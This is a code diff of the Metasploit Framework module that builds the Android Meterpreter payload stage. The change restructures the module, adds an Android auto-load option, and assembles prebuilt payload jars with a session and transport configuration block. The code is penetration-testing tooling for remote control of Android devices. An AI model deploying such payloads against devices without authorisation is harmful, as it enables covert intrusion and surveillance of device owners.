@@ -1,51 +1,71 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#	http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'msf/core/payload/dalvik'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/meterpreter_java'
+require 'msf/base/sessions/meterpreter_android'
 require 'msf/base/sessions/meterpreter_options'
+require 'rex/payloads/meterpreter/config'
 
+module MetasploitModule
 
-module Metasploit3
-	include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MeterpreterOptions
 
-	# The stager should have already included this
-	#include Msf::Payload::Java
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Android Meterpreter',
+      'Description' => 'Run a meterpreter server on Android',
+      'Author'      => ['mihi', 'egypt', 'anwarelmakrahy', 'OJ Reeves'],
+      'Platform'    => 'android',
+      'Arch'        => ARCH_DALVIK,
+      'License'     => MSF_LICENSE,
+      'Session'     => Msf::Sessions::Meterpreter_Java_Android
+    ))
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'			=> 'Android Meterpreter',
-			'Description'	=> 'Run a meterpreter server on Android',
-			'Author'		=> [
-					'mihi', # all the hard work
-					'egypt' # msf integration
-				],
-			'Platform'		=> 'android',
-			'Arch'			=> ARCH_DALVIK,
-			'License'		=> MSF_LICENSE,
-			'Session'		=> Msf::Sessions::Meterpreter_Java_Java))
-	end
+    register_options([
+      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+    ], self.class)
+  end
 
-	#
-	# Override the Payload::Dalvik version so we can load a prebuilt jar to be
-	# used as the final stage
-	#
-	def generate_stage
-		clazz = 'androidpayload.stage.Meterpreter'
-		file = File.join(Msf::Config.data_directory, "android", "metstage.jar")
-		metstage = File.open(file, "rb") {|f| f.read(f.stat.size) }
+  #
+  # Override the Payload::Dalvik version so we can load a prebuilt jar to be
+  # used as the final stage
+  #
+  def generate_stage(opts={})
+    clazz = 'androidpayload.stage.Meterpreter'
+    metstage = MetasploitPayloads.read("android", "metstage.jar")
+    met = MetasploitPayloads.read("android", "meterpreter.jar")
 
-		file = File.join(Msf::Config.data_directory, "android", "meterpreter.jar")
-		met = File.open(file, "rb") {|f| f.read(f.stat.size) }
+    # Name of the class to load from the stage, the actual jar to load
+    # it from, and then finally the meterpreter stage
+    blocks = [
+      java_string(clazz),
+      java_string(metstage),
+      java_string(met),
+      java_string(generate_config(opts))
+    ]
 
-		# Name of the class to load from the stage, the actual jar to load
-		# it from, and then finally the meterpreter stage
-		java_string(clazz) + java_string(metstage) + java_string(met)
-	end
+    (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
+  end
+
+  def generate_config(opts={})
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      ascii_str:  true,
+      arch:       opts[:uuid].arch,
+      expiration: datastore['SessionExpirationTimeout'].to_i,
+      uuid:       opts[:uuid],
+      transports: [transport_config(opts)]
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the XML version of it
+    config.to_b
+  end
 end
